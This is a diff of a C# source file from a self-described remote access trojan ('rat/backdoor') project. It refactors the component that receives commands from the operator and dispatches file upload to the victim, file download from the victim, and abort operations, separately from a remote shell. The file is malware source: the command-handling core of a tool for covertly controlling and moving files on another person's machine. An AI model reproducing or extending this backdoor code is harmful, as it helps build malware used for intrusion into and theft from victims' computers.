@@ -1,9 +1,6 @@
 ﻿using RAT.src.Interfaces;
 using RAT.src.Models.Enums;
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text.RegularExpressions;
 
 namespace RAT.src.Logic.RatCommands
 {
@@ -12,145 +9,67 @@ namespace RAT.src.Logic.RatCommands
     /// </summary>
     public class RatCommandLogic : IRatCommandLogic
     {
-        private ISocketStateLogic _stateLogic;
-        private IClientNotificationLogic _notificationLogic;
-        private IFileDownloader _fileDownloader;
-        private IFileUploader _fileUploader;
-
-        /// <summary>
-        /// Currently available commands for our rat/backdoor.
-        /// </summary>
-        private List<string> _ratCommands = new List<string>()
-            { "upload file -p", "download file -p" };
-
-        /// <summary>
-        /// Our command identifier, if this is found in our string command during receival as first word - then client wants
-        /// to execute rat command, not shell command.
-        /// </summary>
-        private const string _ratCommandIdentifier = "RAT";
+        private readonly ISocketStateLogic _stateLogic;
+        private readonly IClientNotificationLogic _notificationLogic;
+        private readonly IRatCommandInterpreter _ratCommandInterpreter;
+        private readonly IRatCommandFactory _commandFactory;
 
         /// <summary>
         /// Our rat/backdoor commands handling logic.
         /// </summary>
         /// <param name="stateLogic">Logic for our client state.</param>
         /// <param name="notificationLogic">Logic client notification.</param>
-        /// <param name="fileDownloader">Logic for file download (to client).</param>
-        /// <param name="fileUploader">Logic for file upload (to victim).</param>
+        /// <param name="ratCommandInterpreter">String command interpretator.</param>
+        /// <param name="ratCommandFactory">Factory for our command clases.</param>
         public RatCommandLogic(
             ISocketStateLogic stateLogic,
             IClientNotificationLogic notificationLogic,
-            IFileDownloader fileDownloader,
-            IFileUploader fileUploader)
+            IRatCommandInterpreter ratCommandInterpreter,
+            IRatCommandFactory ratCommandFactory)
         {
             _stateLogic = stateLogic;
-            _fileDownloader = fileDownloader;
             _notificationLogic = notificationLogic;
-            _fileUploader = fileUploader;
+            _ratCommandInterpreter = ratCommandInterpreter;
+            _commandFactory = ratCommandFactory;
         }
 
         /// <summary>
-        /// Determines if first word of string is command for rat.
+        /// Handles rat command that client wants to execute.
         /// </summary>
-        /// <param name="command">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
-        /// <returns>True if command is rat command, false is something else.</returns>
-        public bool IsRatCommand(string command)
-        {
-            // Check if first word of string is our command identifier.
-            return Regex.Replace(command.Split()[0], @"[^0-9a-zA-Z\ ]+", "") == _ratCommandIdentifier;
-        }
-
-        /// <summary>
-        /// Handles rat command that clien wants to execute.
-        /// </summary>
-        /// <param name="command">Command to handle (such as file upload, download, etc)./param>
+        /// <param name="command">Command to handle (such as file upload, download, etc).</param>
         public void HandleRatCommand(string command)
         {
-            var clientState = _stateLogic.State;
-            var formattedCommand = this.FormatCommand(command);
-
-            // Here goes custom command interpreter, not using any libs for argument handling.
-            if (!this.IsValidRatCommand(formattedCommand))
+            // If this is known rat command, then get it in formatted state and proceed with further read.
+            (bool isKnownRatCommand, string ratCommandInStringFormat) = _ratCommandInterpreter.IsKnownRatCommand(command);
+            if (!isKnownRatCommand)
             {
-                _notificationLogic.NotifyClient($"\"{formattedCommand}\" is unrecognized RAT command\n");
+                _notificationLogic.NotifyClient($"\nCommand \"{command}\" is unknown RAT command\n");
                 return;
             }
 
-            /////// -------- CAN BE REFACTORED LIKE COMMAND/QUERY WITH "ABORT" FUNCTIONALITY
-            var words = formattedCommand.Split();
-            string cleanCommand = words[1] + ' ' + words[2];
-            if (cleanCommand == "download file") // CAN BE MOVED TO ENUM
+            RatAvailableCommands staticRatCommand = (RatAvailableCommands)Enum.Parse(typeof(RatAvailableCommands), ratCommandInStringFormat, ignoreCase: true);
+
+            // If user chose to abort some command.
+            if (staticRatCommand == RatAvailableCommands.Abort)
             {
-                int indexOfPath = formattedCommand.IndexOf(" -p ");
-                if (indexOfPath == -1)
-                {
-                    _notificationLogic.NotifyClient($"\"-p\" (path) argument not found for RAT\n");
-                    return;
-                }
-
-                _fileDownloader.DownloadFile(formattedCommand.Substring(indexOfPath + " -p ".Length).Trim());
+                _stateLogic.State.CurrentRatCommand?.Abort();
+                return;
             }
-            else if (cleanCommand == "upload file") // CAN BE MOVED TO ENUM
-            {
-                //int indexOfPath = formattedCommand.IndexOf(" -p ");
-                //if (indexOfPath == -1)
-                //{
-                //    _notificationLogic.NotifyClient($"\n\"-p\" (path) argument not found for RAT\n");
-                //    return;
-                //}
 
-                //int indexOfFileSize = formattedCommand.IndexOf(" -s ");
-                //if (indexOfFileSize == -1)
-                //{
-                //    _notificationLogic.NotifyClient($"\n\"-s\" (file size) argument not found for RAT\n");
-                //    return;
-                //}
-
-                //string filePath = formattedCommand.Substring(indexOfPath + " -p ".Length).Trim();
-                //string fileSizeInStringFormat = formattedCommand.Substring(indexOfPath + " -s ".Length).Trim();
-
-                //int fileSize = 0;
-                //try
-                //{
-                //    fileSize = Convert.ToInt32(fileSizeInStringFormat);
-                //}
-                //catch (Exception exception)
-                //{
-                //    _notificationLogic.NotifyClient($"\nError: {exception.Message}\n{fileSizeInStringFormat} is bad number\n");
-                //    return;
-                //}
-
-                string filePath = "somepath"; // TEST, REMOVE
-                int fileSize = 4096; // TEST, REMOVE
-                _fileUploader.PrepareForFileUpload(filePath, fileSize);
-            }
-            /////// -------- CAN BE REFACTORED LIKE COMMAND/QUERY WITH "ABORT" FUNCTIONALITY
-            else if (cleanCommand == "abort operation") // CAN BE MOVED TO ENUM
-            {
-                _stateLogic.State.CurrentOperation = CurrentOperation.None;
-                _notificationLogic.NotifyClient($"\nFile upload aborted\n");
-            }
+            // Get class responsible for current command by converted enum.
+            IRatCommand ratCommand = _commandFactory.GetRatCommand(staticRatCommand);
+            _stateLogic.State.CurrentRatCommand = ratCommand;
+            ratCommand.Execute(command);
         }
 
         /// <summary>
-        /// Formats command for interpreter.
+        /// Wrapper for method located in interpreter, so it would be available on upper level.
         /// </summary>
-        /// <param name="command">Command to format.</param>
-        /// <returns>Formatted command.</returns>
-        private string FormatCommand(string command)
+        /// <param name="command">Potential rat command.</param>
+        /// <returns>True if it is potential rat command, false otherwise.</returns>
+        public bool IsRatCommand(string command)
         {
-            // Get rid of \n in the end of command.
-            return command.Substring(0, command.LastIndexOf("\n"));
-        }
-
-        /// <summary>
-        /// Determines if command is valid to be executed/interpreted by program.
-        /// </summary>
-        /// <param name="clientCommand">Command from internet i.e "cd .." for shell, or "dir", whatever.</param>
-        /// <returns>True if is valid command, false otherwise.</returns>
-        private bool IsValidRatCommand(string clientCommand)
-        {
-            return this.IsRatCommand(clientCommand)
-                && _ratCommands.Any(validCommand => clientCommand.Contains(validCommand));
+            return _ratCommandInterpreter.IsRatCommand(command);
         }
     }
 }
